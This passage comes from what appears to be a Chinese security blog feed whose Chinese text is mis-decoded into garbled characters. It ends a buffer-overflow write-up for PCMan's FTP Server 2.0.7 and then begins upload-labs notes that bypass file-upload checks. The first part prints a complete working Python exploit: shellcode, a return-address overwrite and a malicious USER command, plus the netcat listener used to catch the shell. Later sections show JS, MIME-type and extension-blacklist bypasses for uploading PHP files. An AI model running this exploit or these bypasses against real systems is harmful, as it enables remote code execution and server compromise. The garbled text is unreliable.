class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># filename: exp.py</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">buf =  <span class="string">&quot;&quot;</span></span><br><span class="line">buf += <span class="string">&quot;\xdb\xd5\xbd\x8c\x36\xb0\x37\xd9\x74\x24\xf4\x58\x2b&quot;</span></span><br><span class="line">buf += <span class="string">&quot;\xc9\xb1\x52\x31\x68\x17\x83\xe8\xfc\x03\xe4\x25\x52&quot;</span></span><br><span class="line">buf += <span class="string">&quot;\xc2\x08\xa1\x10\x2d\xf0\x32\x75\xa7\x15\x03\xb5\xd3&quot;</span></span><br><span class="line">buf += <span class="string">&quot;\x5e\x34\x05\x97\x32\xb9\xee\xf5\xa6\x4a\x82\xd1\xc9&quot;</span></span><br><span class="line">buf += <span class="string">&quot;\xfb\x29\x04\xe4\xfc\x02\x74\x67\x7f\x59\xa9\x47\xbe&quot;</span></span><br><span class="line">buf += <span class="string">&quot;\x92\xbc\x86\x87\xcf\x4d\xda\x50\x9b\xe0\xca\xd5\xd1&quot;</span></span><br><span class="line">buf += <span class="string">&quot;\x38\x61\xa5\xf4\x38\x96\x7e\xf6\x69\x09\xf4\xa1\xa9&quot;</span></span><br><span class="line">buf += <span class="string">&quot;\xa8\xd9\xd9\xe3\xb2\x3e\xe7\xba\x49\xf4\x93\x3c\x9b&quot;</span></span><br><span class="line">buf += <span class="string">&quot;\xc4\x5c\x92\xe2\xe8\xae\xea\x23\xce\x50\x99\x5d\x2c&quot;</span></span><br><span class="line">buf += <span class="string">&quot;\xec\x9a\x9a\x4e\x2a\x2e\x38\xe8\xb9\x88\xe4\x08\x6d&quot;</span></span><br><span class="line">buf += <span class="string">&quot;\x4e\x6f\x06\xda\x04\x37\x0b\xdd\xc9\x4c\x37\x56\xec&quot;</span></span><br><span class="line">buf += <span class="string">&quot;\x82\xb1\x2c\xcb\x06\x99\xf7\x72\x1f\x47\x59\x8a\x7f&quot;</span></span><br><span class="line">buf += <span class="string">&quot;\x28\x06\x2e\xf4\xc5\x53\x43\x57\x82\x90\x6e\x67\x52&quot;</span></span><br><span class="line">buf += <span class="string">&quot;\xbf\xf9\x14\x60\x60\x52\xb2\xc8\xe9\x7c\x45\x2e\xc0&quot;</span></span><br><span class="line">buf += <span class="string">&quot;\x39\xd9\xd1\xeb\x39\xf0\x15\xbf\x69\x6a\xbf\xc0\xe1&quot;</span></span><br><span class="line">buf += <span class="string">&quot;\x6a\x40\x15\xa5\x3a\xee\xc6\x06\xea\x4e\xb7\xee\xe0&quot;</span></span><br><span class="line">buf += <span class="string">&quot;\x40\xe8\x0f\x0b\x8b\x81\xba\xf6\x5c\x02\x2a\xf2\x13&quot;</span></span><br><span class="line">buf += <span class="string">&quot;\x32\x49\x02\x28\x11\xc4\xe4\x5a\x85\x81\xbf\xf2\x3c&quot;</span></span><br><span class="line">buf += <span class="string">&quot;\x88\x4b\x62\xc0\x06\x36\xa4\x4a\xa5\xc7\x6b\xbb\xc0&quot;</span></span><br><span class="line">buf += <span class="string">&quot;\xdb\x1c\x4b\x9f\x81\x8b\x54\x35\xad\x50\xc6\xd2\x2d&quot;</span></span><br><span class="line">buf += <span class="string">&quot;\x1e\xfb\x4c\x7a\x77\xcd\x84\xee\x65\x74\x3f\x0c\x74&quot;</span></span><br><span class="line">buf += <span class="string">&quot;\xe0\x78\x94\xa3\xd1\x87\x15\x21\x6d\xac\x05\xff\x6e&quot;</span></span><br><span class="line">buf += <span class="string">&quot;\xe8\x71\xaf\x38\xa6\x2f\x09\x93\x08\x99\xc3\x48\xc3&quot;</span></span><br><span class="line">buf += <span class="string">&quot;\x4d\x95\xa2\xd4\x0b\x9a\xee\xa2\xf3\x2b\x47\xf3\x0c&quot;</span></span><br><span class="line">buf += <span class="string">&quot;\x83\x0f\xf3\x75\xf9\xaf\xfc\xac\xb9\xd0\x1e\x64\xb4&quot;</span></span><br><span class="line">buf += <span class="string">&quot;\x78\x87\xed\x75\xe5\x38\xd8\xba\x10\xbb\xe8\x42\xe7&quot;</span></span><br><span class="line">buf += <span class="string">&quot;\xa3\x99\x47\xa3\x63\x72\x3a\xbc\x01\x74\xe9\xbd\x03&quot;</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;A&quot;</span> * <span class="number">2001</span> + <span class="string">&quot;\x7b\x46\x86\x7c&quot;</span> + <span class="string">&quot;\x90&quot;</span> * <span class="number">30</span> + buf</span><br><span class="line">host = sys.argv[<span class="number">1</span>] <span class="comment"># receive IP</span></span><br><span class="line">port = int(sys.argv[<span class="number">2</span>])<span class="comment"># receive port</span></span><br><span class="line"></span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">s.connect((host, port))</span><br><span class="line">s.send(<span class="string">&quot;USER &quot;</span> + payload)</span><br><span class="line">s.recv(<span class="number">1024</span>)</span><br><span class="line">s.send(<span class="string">&quot;PASS Tao&quot;</span>)</span><br><span class="line">s.recv(<span class="number">1024</span>)</span><br></pre></td></tr></table></figure><p>kali2.0 ä½¿ç”¨<code>nc -lp 1234</code> ç›‘å¬1234ç«¯å£ï¼Œç„¶åæ‰§è¡Œ<code>./exp.py 172.16.10.156 21</code> </p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20201116143051811.png" alt="image-20201116143051811"></p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20201116143136212.png" alt="image-20201116143136212"></p><p>æˆåŠŸï¼</p><blockquote><p>å‚è€ƒæ–‡ç« ï¼š<a href="http://www.legendsec.org/2020.html%EF%BC%8C">http://www.legendsec.org/2020.htmlï¼Œ</a> <a href="https://www.anquanke.com/post/id/84893">https://www.anquanke.com/post/id/84893</a></p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;å®éªŒç¯å¢ƒ&quot;&gt;&lt;a href=&quot;#å®éªŒç¯å¢ƒ&quot; class=&quot;headerlink&quot; title=&quot;å®éªŒç¯å¢ƒ&quot;&gt;&lt;/a&gt;å®éªŒç¯å¢ƒ&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;WindowsXP-SP3ï¼ˆ&lt;code&gt;PCManâ€™s FTP Server 2.0.7&lt;/cod</summary>
      
    
    
    
    <category term="ç½‘ç»œå®‰å…¨" scheme="https://taonn.github.io/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="æº¢å‡ºæ”»å‡»" scheme="https://taonn.github.io/tags/%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB/"/>
    
  </entry>
  
  <entry>
    <title>upload-labsç¬”è®°</title>
    <link href="https://taonn.github.io/2020/11/03/upload-labs%E7%AC%94%E8%AE%B0/"/>
    <id>https://taonn.github.io/2020/11/03/upload-labs%E7%AC%94%E8%AE%B0/</id>
    <published>2020-11-03T14:54:50.000Z</published>
    <updated>2021-03-16T05:29:01.518Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>è¯´æ˜ï¼šåšé¢˜å‰å…ˆæ¸…ç©ºä¹‹å‰å…³å¡ä¸Šä¼ çš„æ–‡ä»¶</p></blockquote><h2 id="Pass-01-jsæ£€æŸ¥"><a href="#Pass-01-jsæ£€æŸ¥" class="headerlink" title="Pass-01 jsæ£€æŸ¥"></a>Pass-01 jsæ£€æŸ¥</h2><h3 id="1-åˆ†æ"><a href="#1-åˆ†æ" class="headerlink" title="1. åˆ†æ"></a>1. åˆ†æ</h3><p>é¦–å…ˆæˆ‘ä»¬å…ˆä¸Šä¼ ä¸€å¼ æ­£å¸¸çš„å›¾ç‰‡ï¼Œç¡®å®šä¸Šä¼ åæ–‡ä»¶ä¿å­˜çš„è·¯åŠ²</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20201103110837756.png" alt="image-20201103110837756"></p><blockquote><p>ä¸Šä¼ è·¯åŠ²ä¸º<code>../upload/</code>, ä¹Ÿå°±æ˜¯<code>http://ip/upload/tao.jpg</code></p></blockquote><p>æŸ¥çœ‹æºä»£ç ï¼Œå‘ç°åŸºäºå‰ç«¯jsçš„æ£€æŸ¥ï¼Œåªæ£€æŸ¥äº†æ–‡ä»¶ä¸Šä¼ çš„åç¼€ï¼Œé‚£ä¹ˆæˆ‘ä»¬åŸºäºå‰ç«¯æ§åˆ¶å°ï¼Œå°±è¯¥å³å¯ç»•è¿‡</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20201103110631693.png" alt="image-20201103110631693"></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Pass-01</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkFile</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> file = <span class="built_in">document</span>.getElementsByName(<span class="string">&#x27;upload_file&#x27;</span>)[<span class="number">0</span>].value;</span><br><span class="line">        <span class="keyword">if</span> (file == <span class="literal">null</span> || file == <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">            alert(<span class="string">&quot;è¯·é€‰æ‹©è¦ä¸Šä¼ çš„æ–‡ä»¶!&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//å®šä¹‰å…è®¸ä¸Šä¼ çš„æ–‡ä»¶ç±»å‹</span></span><br><span class="line">        <span class="keyword">var</span> allow_ext = <span class="string">&quot;.jpg|.png|.gif&quot;</span>;</span><br><span class="line">        <span class="comment">//æå–ä¸Šä¼ æ–‡ä»¶çš„ç±»å‹</span></span><br><span class="line">        <span class="keyword">var</span> ext_name = file.substring(file.lastIndexOf(<span class="string">&quot;.&quot;</span>));</span><br><span class="line">        <span class="comment">//åˆ¤æ–­ä¸Šä¼ æ–‡ä»¶ç±»å‹æ˜¯å¦å…è®¸ä¸Šä¼ </span></span><br><span class="line">        <span class="keyword">if</span> (allow_ext.indexOf(ext_name) == <span class="number">-1</span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> errMsg = <span class="string">&quot;è¯¥æ–‡ä»¶ä¸å…è®¸ä¸Šä¼ ï¼Œè¯·ä¸Šä¼ &quot;</span> + allow_ext + <span class="string">&quot;ç±»å‹çš„æ–‡ä»¶,å½“å‰æ–‡ä»¶ç±»å‹ä¸ºï¼š&quot;</span> + ext_name;</span><br><span class="line">            alert(errMsg);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h3 id="2-åˆ©ç”¨"><a href="#2-åˆ©ç”¨" class="headerlink" title="2. åˆ©ç”¨"></a>2. åˆ©ç”¨</h3><p>æˆ‘ä»¬å°†ä¸Šè¿°ä»£ç å…è®¸ä¿®æ”¹æˆ<code>.php</code>, ç„¶åå¤åˆ¶ä»£ç åœ¨<code>concole</code>æ‰§è¡Œï¼Œ æ‰§è¡Œå¦‚ä¸‹å›¾ï¼š</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20201103111418840.png" alt="image-20201103111418840"></p><p>ç„¶åæˆ‘ä»¬ä¸Šä¼ phpæ–‡ä»¶</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20201103111639392.png" alt="image-20201103111639392"></p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20201103111651040.png" alt="image-20201103111651040"></p><h2 id="Pass-02-MIMEç±»å‹æ£€æŸ¥"><a href="#Pass-02-MIMEç±»å‹æ£€æŸ¥" class="headerlink" title="Pass-02 MIMEç±»å‹æ£€æŸ¥"></a>Pass-02 MIMEç±»å‹æ£€æŸ¥</h2><h3 id="1-åˆ†æ-1"><a href="#1-åˆ†æ-1" class="headerlink" title="1. åˆ†æ"></a>1. åˆ†æ</h3><p>æŸ¥çœ‹æºä»£ç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Pass-02</span></span><br><span class="line">$is_upload = <span class="literal">false</span>;</span><br><span class="line">$msg = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (($_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;image/jpeg&#x27;</span>) || ($_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;image/png&#x27;</span>) || ($_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;image/gif&#x27;</span>)) &#123;</span><br><span class="line">            $temp_file = $_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            $img_path = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span> . $_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]            </span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class="line">                $is_upload = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $msg = <span class="string">&#x27;ä¸Šä¼ å‡ºé”™ï¼&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">&#x27;æ–‡ä»¶ç±»å‹ä¸æ­£ç¡®ï¼Œè¯·é‡æ–°ä¸Šä¼ ï¼&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = UPLOAD_PATH.<span class="string">&#x27;æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¸Šé¢ä»£ç ç¬¬5è¡Œåªå¯¹æ–‡ä»¶çš„<code>MIME</code>ç±»å‹è¿›è¡Œäº†æ£€æŸ¥ï¼ŒåŠåªå¯¹httpåŒ…å¤´<code>Content-type</code>å­—æ®µè¿›è¡Œäº†æ ¡éªŒ</p><p>å¸¸è§MIMEç±»å‹</p><table><thead><tr><th align="left">ç±»å‹</th><th align="left">æè¿°</th><th align="left">å…¸å‹ç¤ºä¾‹</th></tr></thead><tbody><tr><td align="left"><code>text</code></td><td align="left">è¡¨æ˜æ–‡ä»¶æ˜¯æ™®é€šæ–‡æœ¬ï¼Œç†è®ºä¸Šæ˜¯äººç±»å¯è¯»</td><td align="left"><code>text/plain</code>, <code>text/html</code>, <code>text/css, text/javascript</code></td></tr><tr><td align="left"><code>image</code></td><td align="left">è¡¨æ˜æ˜¯æŸç§å›¾åƒã€‚ä¸åŒ…æ‹¬è§†é¢‘ï¼Œä½†æ˜¯åŠ¨æ€å›¾ï¼ˆæ¯”å¦‚åŠ¨æ€gifï¼‰ä¹Ÿä½¿ç”¨imageç±»å‹</td><td align="left"><code>image/gif</code>, <code>image/png</code>, <code>image/jpeg</code>, <code>image/bmp</code>, <code>image/webp</code>, <code>image/x-icon</code>, <code>image/vnd.microsoft.icon</code></td></tr><tr><td align="left"><code>audio</code></td><td align="left">è¡¨æ˜æ˜¯æŸç§éŸ³é¢‘æ–‡ä»¶</td><td align="left"><code>audio/midi</code>, <code>audio/mpeg, audio/webm, audio/ogg, audio/wav</code></td></tr><tr><td align="left"><code>video</code></td><td align="left">è¡¨æ˜æ˜¯æŸç§è§†é¢‘æ–‡ä»¶</td><td align="left"><code>video/webm</code>, <code>video/ogg</code></td></tr><tr><td align="left"><code>application</code></td><td align="left">è¡¨æ˜æ˜¯æŸç§äºŒè¿›åˆ¶æ•°æ®</td><td align="left"><code>application/octet-stream</code>, <code>application/pkcs12</code>, <code>application/vnd.mspowerpoint</code>, <code>application/xhtml+xml</code>, <code>application/xml</code>, <code>application/pdf</code></td></tr></tbody></table><h3 id="2-åˆ©ç”¨-1"><a href="#2-åˆ©ç”¨-1" class="headerlink" title="2. åˆ©ç”¨"></a>2. åˆ©ç”¨</h3><p>å› ä¸ºä»£ç åªå¯¹<code>Content-type</code>å­—æ®µè¿›è¡Œäº†æ ¡éªŒï¼Œ æˆ‘ä»¬ä½¿ç”¨<code>burp</code>ä¿®æ”¹ç¬¦å·çš„ç±»å‹å³å¯ç»•è¿‡</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20201103112446651.png" alt="image-20201103112446651"></p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20201103112523478.png" alt="image-20201103112523478"></p><h2 id="Pass-03-é»‘åå•ç»•è¿‡"><a href="#Pass-03-é»‘åå•ç»•è¿‡" class="headerlink" title="Pass-03 é»‘åå•ç»•è¿‡"></a>Pass-03 é»‘åå•ç»•è¿‡</h2><h3 id="1-åˆ†æ-2"><a href="#1-åˆ†æ-2" class="headerlink" title="1. åˆ†æ"></a>1. åˆ†æ</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Pass-03</span></span><br><span class="line">$is_upload = <span class="literal">false</span>;</span><br><span class="line">$msg = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">&#x27;.asp&#x27;</span>,<span class="string">&#x27;.aspx&#x27;</span>,<span class="string">&#x27;.php&#x27;</span>,<span class="string">&#x27;.jsp&#x27;</span>);</span><br><span class="line">        $file_name = trim($_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        $file_name = deldot($file_name);<span class="comment">//åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹</span></span><br><span class="line">        $file_ext = strrchr($file_name, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        $file_ext = strtolower($file_ext); <span class="comment">//è½¬æ¢ä¸ºå°å†™</span></span><br><span class="line">        $file_ext = str_ireplace(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, $file_ext);<span class="comment">//å»é™¤å­—ç¬¦ä¸²::$DATA</span></span><br><span class="line">        $file_ext = trim($file_ext); <span class="comment">//æ”¶å°¾å»ç©º</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            $temp_file = $_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            $img_path = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.date(<span class="string">&quot;YmdHis&quot;</span>).rand(<span class="number">1000</span>,<span class="number">9999</span>).$file_ext;            </span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file,$img_path)) &#123;</span><br><span class="line">                 $is_upload = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $msg = <span class="string">&#x27;ä¸Šä¼ å‡ºé”™ï¼&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">&#x27;ä¸å…è®¸ä¸Šä¼ .asp,.aspx,.php,.jspåç¼€æ–‡ä»¶ï¼&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = UPLOAD_PATH . <span class="string">&#x27;æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>trim() å‡½æ•°ç§»é™¤å­—ç¬¦ä¸²ä¸¤ä¾§çš„ç©ºç™½å­—ç¬¦æˆ–å…¶ä»–é¢„å®šä¹‰å­—ç¬¦</p><p>è¯­æ³•ï¼š<code>trim(string,charlist)</code></p></blockquote><table><thead><tr><th align="left">å‚æ•°</th><th align="left">æè¿°</th></tr></thead><tbody><tr><td align="left"><em>string</em></td><td align="left">å¿…éœ€ã€‚è§„å®šè¦æ£€æŸ¥çš„å­—ç¬¦ä¸²ã€‚</td></tr><tr><td align="left"><em>charlist</em></td><td align="left">å¯é€‰ã€‚è§„å®šä»å­—ç¬¦ä¸²ä¸­åˆ é™¤å“ªäº›å­—ç¬¦ã€‚å¦‚æœè¢«çœç•¥ï¼Œåˆ™ç§»é™¤ä»¥ä¸‹æ‰€æœ‰å­—ç¬¦ï¼š<br />â€œ\0â€ - NULLâ€\tâ€ <br />- åˆ¶è¡¨ç¬¦â€\nâ€<br /> - æ¢è¡Œâ€\x0Bâ€<br /> - å‚ç›´åˆ¶è¡¨ç¬¦â€\râ€<br /> - å›è½¦â€ â€œ<br /> - ç©ºæ ¼</td></tr></tbody></table><blockquote><p>deldot(file_name);     //åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">deldot</span>(<span class="params">$s</span>)</span>&#123;</span><br><span class="line"><span class="keyword">for</span>($i = strlen($s)<span class="number">-1</span>;$i&gt;<span class="number">0</span>;$i--)&#123;</span><br><span class="line">$c = substr($s,$i,<span class="number">1</span>);</span><br><span class="line"><span class="keyword">if</span>($i == strlen($s)<span class="number">-1</span> <span class="keyword">and</span> $c != <span class="string">&#x27;.&#x27;</span>)&#123;</span><br><span class="line"><span class="keyword">return</span> $s;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($c != <span class="string">&#x27;.&#x27;</span>)&#123;</span><br><span class="line"><span class="keyword">return</span> substr($s,<span class="number">0</span>,$i+<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>strrchr() å‡½æ•°æŸ¥æ‰¾å­—ç¬¦ä¸²åœ¨å¦ä¸€ä¸ªå­—ç¬¦ä¸²ä¸­æœ€åä¸€æ¬¡å‡ºç°çš„ä½ç½®ï¼Œå¹¶è¿”å›ä»è¯¥ä½ç½®åˆ°å­—ç¬¦ä¸²ç»“å°¾çš„æ‰€æœ‰å­—ç¬¦</p><p>è¯­æ³•ï¼š<code>strrchr(string,char)</code></p></blockquote><table><thead><tr><th align="left">å‚æ•°</th><th align="left">æè¿°</th></tr></thead><tbody><tr><td align="left"><em>string</em></td><td align="left">å¿…éœ€ã€‚è§„å®šè¦æœç´¢çš„å­—ç¬¦ä¸²ã€‚</td></tr><tr><td align="left"><em>char</em></td><td align="left">å¿…éœ€ã€‚è§„å®šè¦æŸ¥æ‰¾çš„å­—ç¬¦ã€‚å¦‚æœè¯¥å‚æ•°æ˜¯æ•°å­—ï¼Œåˆ™æœç´¢åŒ¹é…æ­¤æ•°å­—çš„ ASCII å€¼çš„å­—ç¬¦ã€‚</td></tr><tr><td align="left">è¿”å›å€¼</td><td align="left">è¿”å›ä»æŸä¸ªå­—ç¬¦ä¸²åœ¨å¦ä¸€ä¸ªå­—ç¬¦ä¸²ä¸­æœ€åä¸€æ¬¡å‡ºç°çš„ä½ç½®åˆ°ä¸»å­—ç¬¦ä¸²ç»“å°¾çš„æ‰€æœ‰å­—ç¬¦ã€‚</td></tr></tbody></table><blockquote><p>strtolower() å‡½æ•°æŠŠå­—ç¬¦ä¸²è½¬æ¢ä¸ºå°å†™</p></blockquote><blockquote><p>str_ireplace() å‡½æ•°æ›¿æ¢å­—ç¬¦ä¸²ä¸­çš„ä¸€äº›å­—ç¬¦ï¼ˆä¸åŒºåˆ†å¤§å°å†™ï¼‰ã€‚</p><p>è¯¥å‡½æ•°å¿…é¡»éµå¾ªä¸‹åˆ—è§„åˆ™ï¼š</p><ul><li>å¦‚æœæœç´¢çš„å­—ç¬¦ä¸²æ˜¯ä¸€ä¸ªæ•°ç»„ï¼Œé‚£ä¹ˆå®ƒå°†è¿”å›ä¸€ä¸ªæ•°ç»„ã€‚</li><li>å¦‚æœæœç´¢çš„å­—ç¬¦ä¸²æ˜¯ä¸€ä¸ªæ•°ç»„ï¼Œé‚£ä¹ˆå®ƒå°†å¯¹æ•°ç»„ä¸­çš„æ¯ä¸ªå…ƒç´ è¿›è¡ŒæŸ¥æ‰¾å’Œæ›¿æ¢ã€‚</li><li>å¦‚æœåŒæ—¶éœ€è¦å¯¹æ•°ç»„è¿›è¡ŒæŸ¥æ‰¾å’Œæ›¿æ¢ï¼Œå¹¶ä¸”éœ€è¦æ‰§è¡Œæ›¿æ¢çš„å…ƒç´ å°‘äºæŸ¥æ‰¾åˆ°çš„å…ƒç´ çš„æ•°é‡ï¼Œé‚£ä¹ˆå¤šä½™å…ƒç´ å°†ç”¨ç©ºå­—ç¬¦ä¸²è¿›è¡Œæ›¿æ¢</li><li>å¦‚æœæ˜¯å¯¹ä¸€ä¸ªæ•°ç»„è¿›è¡ŒæŸ¥æ‰¾ï¼Œä½†åªå¯¹ä¸€ä¸ªå­—ç¬¦ä¸²è¿›è¡Œæ›¿æ¢ï¼Œé‚£ä¹ˆæ›¿ä»£å­—ç¬¦ä¸²å°†å¯¹æ‰€æœ‰æŸ¥æ‰¾åˆ°çš„å€¼èµ·ä½œç”¨</li></ul><p>è¯­æ³•ï¼š<code>str_ireplace(find,replace,string,count)</code></p></blockquote><table><thead><tr><th align="left">å‚æ•°</th><th align="left">æè¿°</th></tr></thead><tbody><tr><td align="left"><em>find</em></td><td align="left">å¿…éœ€ã€‚è§„å®šè¦æŸ¥æ‰¾çš„å€¼ã€‚</td></tr><tr><td align="left"><em>replace</em></td><td align="left">å¿…éœ€ã€‚è§„å®šæ›¿æ¢ <em>find</em> ä¸­çš„å€¼çš„å€¼ã€‚</td></tr><tr><td align="left"><em>string</em></td><td align="left">å¿…éœ€ã€‚è§„å®šè¢«æœç´¢çš„å­—ç¬¦ä¸²ã€‚</td></tr><tr><td align="left"><em>count</em></td><td align="left">å¯é€‰ã€‚ä¸€ä¸ªå˜é‡ï¼Œå¯¹æ›¿æ¢æ•°è¿›è¡Œè®¡æ•°ã€‚</td></tr></tbody></table><p>ä¸å…è®¸ä¸Šä¼ <code>.asp,.aspx,.php,.jsp</code>åç¼€æ–‡ä»¶ï¼Œä½†æ˜¯å¯ä»¥ä¸Šä¼ å…¶ä»–ä»»æ„åç¼€</p><p>ä½†æ˜¯å¯ä»¥ä¸Šä¼ å…¶ä»–ä»»æ„åç¼€</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.php .phtml .phps .php5 